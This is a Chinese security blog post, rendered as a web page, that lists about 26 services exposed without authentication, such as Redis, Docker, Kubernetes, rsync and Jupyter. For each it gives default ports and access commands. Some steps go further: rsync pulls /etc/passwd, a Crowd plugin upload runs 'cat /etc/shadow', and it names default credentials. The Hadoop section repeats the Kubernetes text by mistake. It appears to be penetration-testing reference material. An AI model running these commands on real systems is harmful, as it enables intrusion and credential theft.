@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>未授权漏洞收集 | wangzhiii的博客</title><meta name="author" content="wangzhiii"><meta name="copyright" content="wangzhiii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017 1.redis未授权 默认端口6379  漏洞验证 安装Redi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="未授权漏洞收集">
+<meta property="og:url" content="http://wangzhi0013.github.io/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/index.html">
+<meta property="og:site_name" content="wangzhiii的博客">
+<meta property="og:description" content="默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017 1.redis未授权 默认端口6379  漏洞验证 安装Redi">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://wangzhi0013.github.io/img/11.jpg">
+<meta property="article:published_time" content="2023-06-28T08:05:29.749Z">
+<meta property="article:modified_time" content="2023-06-28T10:08:42.885Z">
+<meta property="article:author" content="wangzhiii">
+<meta property="article:tag" content="博客">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://wangzhi0013.github.io/img/11.jpg"><link rel="shortcut icon" href="/./img/favicon.ico"><link rel="canonical" href="http://wangzhi0013.github.io/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?c44cd7fc8da8c10c754cb732b14e77f3";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '未授权漏洞收集',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-06-28 18:08:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/./img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/./img/11.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="wangzhiii的博客"><span class="site-name">wangzhiii的博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 链接</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">未授权漏洞收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-28T08:05:29.749Z" title="发表于 2023-06-28 16:05:29">2023-06-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-06-28T10:08:42.885Z" title="更新于 2023-06-28 18:08:42">2023-06-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="未授权漏洞收集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>默认端口：21, 139, 873, 2049, 2181, 2182, 2375, 5601, 5672, 5900, 5901, 5984, 6379, 6443, 8080, 8088, 8095, 8161, 9100, 9200, 9300, 11211, 15672, 15692, 20048, 25672, 27017</p>
+<h3 id="1-redis未授权"><a href="#1-redis未授权" class="headerlink" title="1.redis未授权"></a>1.redis未授权</h3><blockquote>
+<p>默认端口6379</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装Redis，然后连接到服务。</p>
+<p> # yum install redis</p>
+<p># redis-cli -h 10.2.20.73 -p 6379</p>
+<p>10.2.20.73:6379&gt; info</p>
+<h3 id="2-mongodb未授权"><a href="#2-mongodb未授权" class="headerlink" title="2.mongodb未授权"></a>2.mongodb未授权</h3><blockquote>
+<p>默认端口27017</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装mongodb，然后连接到服务。</p>
+<p># yum install mongodb</p>
+<p># mongo –host 10.2.20.34 –port 27017</p>
+<p>xxx-test:SECONDARY&gt; show dbs</p>
+<h3 id="3-memcached未授权访问"><a href="#3-memcached未授权访问" class="headerlink" title="3.memcached未授权访问"></a>3.memcached未授权访问</h3><blockquote>
+<p>默认端口11211</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>telnet 10.10.4.89 11211 或 nc -vv <target> 11211</p>
+<p>无需用户名密码，可以直接连接memcache 服务的11211端口</p>
+<p>使用了 stats 命令来输出 Memcached 服务信息</p>
+<h3 id="4-zookeeper未授权"><a href="#4-zookeeper未授权" class="headerlink" title="4.zookeeper未授权"></a>4.zookeeper未授权</h3><blockquote>
+<p>默认端口2181，2182</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>安装ZooKeeper，然后连接到服务。</p>
+<p>ZooKeeper: <a target="_blank" rel="noopener" href="https://zookeeper.apache.org/releases.html">https://zookeeper.apache.org/releases.html</a></p>
+<p># wget <a target="_blank" rel="noopener" href="https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz">https://mirrors.bfsu.edu.cn/apache/zookeeper/zookeeper-3.6.1/apache-zookeeper-3.6.1-bin.tar.gz</a></p>
+<p># tar -xzvf apache-zookeeper-3.6.1-bin.tar.gz</p>
+<p># cd apache-zookeeper-3.6.1-bin&#x2F;bin</p>
+<p># .&#x2F;zkCli.sh -timeout 0 -r -server 10.10.4.72:2181</p>
+<p>备注：windows 下为：zkCli.cmd -timeout 0 -r -server 10.10.4.72:2181</p>
+<h3 id="5-elasticsearch未授权"><a href="#5-elasticsearch未授权" class="headerlink" title="5.elasticsearch未授权"></a>5.elasticsearch未授权</h3><blockquote>
+<p>默认端口 9100，9200，9300</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
+<p>curl <a target="_blank" rel="noopener" href="http://10.2.20.48:9200/">http://10.2.20.48:9200/</a></p>
+<p>curl <a target="_blank" rel="noopener" href="http://10.2.20.48:9200/_cat">http://10.2.20.48:9200/_cat</a></p>
+<p>curl <a target="_blank" rel="noopener" href="http://10.2.20.48:9200/_cat/_river/_search">http://10.2.20.48:9200/_cat/_river/_search</a></p>
+<p>curl <a target="_blank" rel="noopener" href="http://10.2.20.48:9200/cat/indices">http://10.2.20.48:9200/cat/indices</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.2.20.48:9100/metrics">http://10.2.20.48:9100/metrics</a></p>
+<h3 id="6-kibana未授权"><a href="#6-kibana未授权" class="headerlink" title="6.kibana未授权"></a>6.kibana未授权</h3><blockquote>
+<p>默认端口5601（最好是直接访问目录，能访问就能shell</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>直接访问kibana的页面，</p>
+<p>如：<a target="_blank" rel="noopener" href="https://10.10.4.89:5601/">https://10.10.4.89:5601/</a></p>
+<p><a target="_blank" rel="noopener" href="https://10.10.4.89/app/kibana">https://10.10.4.89/app/kibana</a></p>
+<p># <a target="_blank" rel="noopener" href="http://10.10.4.89:5601/app/kibana#/">http://10.10.4.89:5601/app/kibana#/</a></p>
+<p>并且无需账号密码可以登录进入界面。</p>
+<h3 id="7-docker-remote-api-未授权访问"><a href="#7-docker-remote-api-未授权访问" class="headerlink" title="7.docker remote api 未授权访问"></a>7.docker remote api 未授权访问</h3><blockquote>
+<p>默认端口2375</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>直接使用浏览器访问：</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:2375/">http://10.10.4.89:2375/</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:2375/version">http://10.10.4.89:2375/version</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:2375/info">http://10.10.4.89:2375/info</a></p>
+<p>docker -H tcp:&#x2F;&#x2F;192.168.15.5:2375 version</p>
+<p>docker -H tcp:&#x2F;&#x2F;10.10.4.89:2375 images</p>
+<h3 id="8-kubernetes-api-server-未授权访问"><a href="#8-kubernetes-api-server-未授权访问" class="headerlink" title="8.kubernetes api server 未授权访问"></a>8.kubernetes api server 未授权访问</h3><blockquote>
+<p>默认端口 8080，6443</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务</p>
+<p>端口：8080  <a target="_blank" rel="noopener" href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
+<p>端口：8080： api dashboard： <a target="_blank" rel="noopener" href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
+<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
+<h3 id="9-hadoop未授权访问"><a href="#9-hadoop未授权访问" class="headerlink" title="9.hadoop未授权访问"></a>9.hadoop未授权访问</h3><blockquote>
+<p>默认端口8088</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>端口：8080  <a target="_blank" rel="noopener" href="http://10.10.4.89:8080/">http://10.10.4.89:8080/</a></p>
+<p>端口：8080： api dashboard： <a target="_blank" rel="noopener" href="http://10.10.4.89:8080/ui">http://10.10.4.89:8080/ui</a> </p>
+<p>端口：10250端口是kubelet API的HTTPS端口，通过路径&#x2F;pods获取环境变量、运行的容器信息、命名空间等信息。</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:10250/pods">http://10.10.4.89:10250/pods</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy">http://10.10.4.89:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login">http://192.168.56.101:8001/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy/#!/login</a></p>
+<h3 id="10-jenkins未授权访问"><a href="#10-jenkins未授权访问" class="headerlink" title="10.jenkins未授权访问"></a>10.jenkins未授权访问</h3><blockquote>
+<p>默认端口8080</p>
+</blockquote>
+<p>检测方法</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
+<p>然后直接访问：<a target="_blank" rel="noopener" href="http://192.168.18.129:8080/manage">http://192.168.18.129:8080/manage</a></p>
+<h3 id="11-activeMQ未授权访问"><a href="#11-activeMQ未授权访问" class="headerlink" title="11.activeMQ未授权访问"></a>11.activeMQ未授权访问</h3><blockquote>
+<p>默认端口8161</p>
+</blockquote>
+<p>漏洞验证</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放，</p>
+<p>ActiveMQ默认使用8161端口，默认用户名和密码是admin&#x2F;admin</p>
+<h3 id="12-rabbitMQ未授权访问漏洞"><a href="#12-rabbitMQ未授权访问漏洞" class="headerlink" title="12.rabbitMQ未授权访问漏洞"></a>12.rabbitMQ未授权访问漏洞</h3><p>漏洞验证</p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:15672/">http://10.10.4.89:15672</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:25672/">http://10.10.4.89:25672/</a></p>
+<p><a target="_blank" rel="noopener" href="http://10.10.4.89:15692/">http://10.10.4.89:15692/</a></p>
+<p>默认账号密码都是guest</p>
+<h3 id="13-sprintboot-actuator未授权访问"><a href="#13-sprintboot-actuator未授权访问" class="headerlink" title="13.sprintboot actuator未授权访问"></a>13.sprintboot actuator未授权访问</h3><p>漏洞特征，图标(绿叶子)和报错页面</p>
+<p>漏洞验证</p>
+<p>直接访问相关路径：</p>
+<p><a target="_blank" rel="noopener" href="http://10.2.20.48/autoconfig">http://10.2.20.48:/autoconfig</a></p>
+<p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.png" alt="1625021874(1)"></p>
+<p>Spring Boot Actuator从未授权访问到getshell</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/106330264">https://blog.csdn.net/qq_38154820/article/details/106330264</a></p>
+<h3 id="14-FTP未授权访问漏洞（匿名登录）"><a href="#14-FTP未授权访问漏洞（匿名登录）" class="headerlink" title="14.FTP未授权访问漏洞（匿名登录）"></a>14.FTP未授权访问漏洞（匿名登录）</h3><p>漏洞验证</p>
+<p>直接访问ftp路径：<a href="ftp://ip:port/">ftp://ip:port/</a></p>
+<h3 id="15。jboss未授权访问"><a href="#15。jboss未授权访问" class="headerlink" title="15。jboss未授权访问"></a>15。jboss未授权访问</h3><p>漏洞特征：8080端口访问后左上角有jboss logo</p>
+<p>漏洞验证</p>
+<p>先用 nmap 扫描查看端口开放情况看是否开放 JBOSS 端口。再使用漏洞测试工具测试 jmx 组件存在情况通过访问 <a href="http://ip:jboss端口/">http://ip:jboss端口/</a> 看是否能进入 jmx-console 和 web-console 。</p>
+<h3 id="16-ldap未授权访问"><a href="#16-ldap未授权访问" class="headerlink" title="16.ldap未授权访问"></a>16.ldap未授权访问</h3><p>漏洞特征：phpldapadmin</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zh1z3ven/p/13894171.html">https://www.cnblogs.com/Zh1z3ven/p/13894171.html</a></p>
+<p>漏洞验证</p>
+<p>使用nmap寻找到相关的LDAP服务器，可以使用ldapbrowser直接连接，获取目录内容。</p>
+<h3 id="17-rsync未授权访问"><a href="#17-rsync未授权访问" class="headerlink" title="17.rsync未授权访问"></a>17.rsync未授权访问</h3><p>默认端口873</p>
+<p>漏洞验证：</p>
+<p>#rsync rsync:&#x2F;&#x2F;{target_ip}&#x2F;</p>
+<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;</p>
+<p>#rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src</p>
+<p>利用rsync下载任意文件</p>
+<p>rsync rsync:&#x2F;&#x2F;172.16.2.250:873&#x2F;src&#x2F;etc&#x2F;passwd .&#x2F;</p>
+<h3 id="18：vnc未授权访问漏洞"><a href="#18：vnc未授权访问漏洞" class="headerlink" title="18：vnc未授权访问漏洞"></a>18：vnc未授权访问漏洞</h3><p>默认端口5900，5901</p>
+<p>漏洞验证</p>
+<p>vncviewer 192.168.15.8</p>
+<h3 id="19-dubbo未授权访问"><a href="#19-dubbo未授权访问" class="headerlink" title="19.dubbo未授权访问"></a>19.dubbo未授权访问</h3><p>无明显特征</p>
+<p>漏洞验证</p>
+<p>telnet ip port</p>
+<p>链接进入dubbo服务， 进行操作</p>
+<h3 id="20-nfs共享目录未授权访问"><a href="#20-nfs共享目录未授权访问" class="headerlink" title="20.nfs共享目录未授权访问"></a>20.nfs共享目录未授权访问</h3><p>默认端口2049,20048</p>
+<p>漏洞验证</p>
+<p>apt install nfs-common 安装nfs客户端</p>
+<p>showmount -e 192.168.70.162 查看nfs服务器上的共享目录</p>
+<p>mount -t nfs 192.168.70.162:&#x2F;grdata &#x2F;mnt 挂载到本地</p>
+<h3 id="21-druid未授权访问"><a href="#21-druid未授权访问" class="headerlink" title="21.druid未授权访问"></a>21.druid未授权访问</h3><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgclip_image002.jpg" alt="img"></p>
+<p>漏洞描述</p>
+<p>当开发者配置不当时就可能造成未授权访问下面给出常见Druid未授权访问路径</p>
+<p>&#x2F;druid&#x2F;websession.html</p>
+<p>&#x2F;system&#x2F;druid&#x2F;websession.html </p>
+<p>&#x2F;webpage&#x2F;system&#x2F;druid&#x2F;websession.html(jeecg)</p>
+<p>漏洞验证</p>
+<p>访问相关的路径：<a target="_blank" rel="noopener" href="http://10.20.37.152:7001/BSCC/druid/index.html">http://10.20.37.152:7001/BSCC/druid/index.html</a></p>
+<h3 id="22-couchdb未授权访问漏洞"><a href="#22-couchdb未授权访问漏洞" class="headerlink" title="22.couchdb未授权访问漏洞"></a>22.couchdb未授权访问漏洞</h3><p>默认端口：5984</p>
+<p>使用nmap寻找相关的端口和服务，直接访问脆弱的服务：</p>
+<p>curl <a target="_blank" rel="noopener" href="http://192.168.18.129:5984/">http://192.168.18.129:5984</a></p>
+<p>curl <a target="_blank" rel="noopener" href="http://192.168.18.129:5984/_config">http://192.168.18.129:5984/_config</a></p>
+<h3 id="23-atlassian-crowd未授权访问"><a href="#23-atlassian-crowd未授权访问" class="headerlink" title="23.atlassian crowd未授权访问"></a>23.atlassian crowd未授权访问</h3><p>漏洞特征：左上角atlassian的logo端口，默认端口8095</p>
+<p>漏洞验证</p>
+<p>进行上传一个标准的插件，来自atlassian-bundled-plugins中的applinks-plugin-5.4.12.jar</p>
+<p>curl –form “file_cdl&#x3D;@applinks-plugin-5.4.12.jar” <a target="_blank" rel="noopener" href="http://192.168.18.138:8095/crowd/admin/uploadplugin.action">http://192.168.18.138:8095/crowd/admin/uploadplugin.action</a> -v</p>
+<p>访问地址并执行命令：<a target="_blank" rel="noopener" href="http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow">http://10.10.20.166:8095/crowd/plugins/servlet/exp?cmd=cat%20/etc/shadow</a></p>
+<h3 id="24-jupyternotebook未授权访问"><a href="#24-jupyternotebook未授权访问" class="headerlink" title="24.jupyternotebook未授权访问"></a>24.jupyternotebook未授权访问</h3><p>漏洞特征：左上角有logo，jupyter</p>
+<p>漏洞验证</p>
+<p>利用nmap 扫描端口，获取到服务，访问地址：<a target="_blank" rel="noopener" href="http://192.168.18.129:8888/">http://192.168.18.129:8888</a></p>
+<p>利用terminal命令执行：New &gt; Terminal 创建控制台</p>
+<p>可以执行任意命令</p>
+<h3 id="25-windows-ipc-共享未授权访问"><a href="#25-windows-ipc-共享未授权访问" class="headerlink" title="25,windows ipc 共享未授权访问"></a>25,windows ipc 共享未授权访问</h3><p>工具扫描，远程验证</p>
+<h3 id="26-rtsp未授权访问"><a href="#26-rtsp未授权访问" class="headerlink" title="26.rtsp未授权访问"></a>26.rtsp未授权访问</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://wangzhi0013.github.io">wangzhiii</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://wangzhi0013.github.io/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/">http://wangzhi0013.github.io/2023/06/28/%E6%9C%AA%E6%8E%88%E6%9D%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://wangzhi0013.github.io" target="_blank">wangzhiii的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/./img/11.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div 